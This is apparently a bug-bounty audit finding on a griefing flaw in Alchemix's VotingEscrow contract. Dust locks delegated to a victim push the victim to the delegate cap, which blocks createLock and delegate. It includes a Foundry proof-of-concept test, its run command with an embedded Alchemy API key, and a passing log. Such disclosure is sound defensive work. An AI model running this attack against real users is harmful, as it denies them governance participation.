---
# Core Classification
protocol: Alchemix
chain: everychain
category: uncategorized
vulnerability_type: unknown

# Attack Vector Details
attack_type: unknown
affected_component: smart_contract

# Source Information
source: solodit
solodit_id: 38183
audit_firm: Immunefi
contest_link: https://immunefi.com/bounty/alchemix-boost/
source_link: none
github_link: https://raw.githubusercontent.com/immunefi-team/Bounty_Boosts/main/Alchemix/31298%20-%20%5bSC%20-%20Medium%5d%20Anyone%20can%20let%20users%20delegates%20reach%20the%20upper%20....md

# Impact Classification
severity: medium
impact: security_vulnerability
exploitability: 0.00
financial_impact: medium

# Scoring
quality_score: 0
rarity_score: 0

# Context Tags
tags:

protocol_categories:
  - liquid_staking
  - dexes
  - yield
  - cross_chain
  - rwa

# Audit Details
report_date: unknown
finders_count: 1
finders:
  - yttriumzz
---

## Vulnerability Title

Anyone can let user's delegates reach the upper limit causing users to be unable to add more delegates

### Overview


This is a report about a bug found in a smart contract called VotingEscrow, which is used for delegating tokens in the Alchemix Finance protocol. The bug allows an attacker to manipulate the contract and cause damage to users or the protocol, without any profit motive. This can lead to a denial of service (DOS) attack on certain operations, affecting governance voting. The suggested fix is to set a minimum number of individual delegates to prevent this type of attack. A proof of concept has been provided to demonstrate the bug. 

### Original Finding Content

Report type: Smart Contract


Target: https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol

Impacts:
- Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description
## Brief/Intro

Each user in the `VotingEscrow` contract has a maximum number of delegate $veToken. Any user can delegate his $veToken to other users. An attacker can exploit this to let user's delegate to reach the upper limit.

## Vulnerability Details

This bug involves `createLock` operation

```solidity
///// https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L1040
                require(dstTokensOld.length + 1 <= MAX_DELEGATES, "dst would have too many tokenIds");
```

and `delegate` operation

```solidity
///// https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L1110
                require(dstTokensOld.length + ownerTokenCount <= MAX_DELEGATES, "dst would have too many tokenIds");
```

In other words, an attacker can use this bug to DOS `createLock` and `delegate` operations of user.

**Suggested fix**

It is recommended that user can set the minimum number of individual delegates to prevent dust attacks

## Impact Details

An attacker can make the user no longer able to be delegated and mint $veToken. Causes users to be DOSed and may affect governance voting.

## References

None

## Proof of concept
The PoC patch

```diff
diff --git a/src/test/VotingEscrow.t.sol b/src/test/VotingEscrow.t.sol
index 6e828a3..73ca043 100644
--- a/src/test/VotingEscrow.t.sol
+++ b/src/test/VotingEscrow.t.sol
@@ -1015,4 +1015,25 @@ contract VotingEscrowTest is BaseTest {
 
         hevm.stopPrank();
     }
+
+    function testYttriumzzPocTemp() external {
+        address attacker = address(0xa77ac8e3);
+        address user = address(0xacc);
+        deal(bpt, attacker, 1e18);
+        deal(bpt, user, 1e18);
+
+        hevm.startPrank(attacker);
+        IERC20(bpt).approve(address(veALCX), type(uint256).max);
+        for (uint256 i = 0; i < veALCX.MAX_DELEGATES(); i++) {
+            veALCX.createLock(1, 0, true);
+        }
+        veALCX.delegate(user);
+        hevm.stopPrank();
+
+        hevm.startPrank(user);
+        IERC20(bpt).approve(address(veALCX), type(uint256).max);
+        hevm.expectRevert("dst would have too many tokenIds");
+        veALCX.createLock(1, 0, true);
+        hevm.stopPrank();
+    }
 }
```

Run the PoC

```bash
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/VFefkgjj8h3SgRYcCvmtp9KoMJJij6gD --fork-block-number 17133822 -vvv --match-test testYttriumzzPocTemp
```

The log

```bash
$ FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/VFefkgjj8h3SgRYcCvmtp9KoMJJij6gD --fork-block-number 17133822 -vvv --match-test testYttriumzzPocTemp
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for src/test/VotingEscrow.t.sol:VotingEscrowTest
[PASS] testYttriumzzPocTemp() (gas: 764132469)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.47s (3.45s CPU time)

Ran 1 test suite in 4.46s (3.47s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Metadata

| Field | Value |
|-------|-------|
| Impact | MEDIUM |
| Quality Score | 0/5 |
| Rarity Score | 0/5 |
| Audit Firm | Immunefi |
| Protocol | Alchemix |
| Report Date | N/A |
| Finders | yttriumzz |

### Source Links

- **Source**: N/A
- **GitHub**: https://raw.githubusercontent.com/immunefi-team/Bounty_Boosts/main/Alchemix/31298%20-%20%5bSC%20-%20Medium%5d%20Anyone%20can%20let%20users%20delegates%20reach%20the%20upper%20....md
- **Contest**: https://immunefi.com/bounty/alchemix-boost/

### Keywords for Search

`vulnerability`

